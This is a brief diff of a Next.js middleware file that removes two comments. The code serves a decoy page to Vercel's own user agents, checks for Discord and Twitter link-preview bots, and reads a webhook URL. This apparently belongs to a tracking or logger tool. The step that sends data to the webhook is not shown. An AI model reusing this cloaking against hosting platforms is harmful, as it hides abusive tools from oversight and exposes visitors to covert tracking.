@@ -1,11 +1,10 @@
 import { NextRequest, NextResponse, userAgent } from 'next/server';
 
-const webhook = process.env.WEBHOOK_URL // Your webhook URL now is in your project's environment variables.
+const webhook = process.env.WEBHOOK_URL
 
 export async function middleware(req){
   const ua = userAgent(req)?.ua;
   if(!ua || ua.startsWith("vercel-")){
-    // Displaying another page for Vercel
     return NextResponse.rewrite(new URL("/vercel.html",req.url));
   }
   const source = ["Mozilla/5.0 (compatible; Discordbot/","Twitterbot/"].find(u=>ua?.startsWith(u))
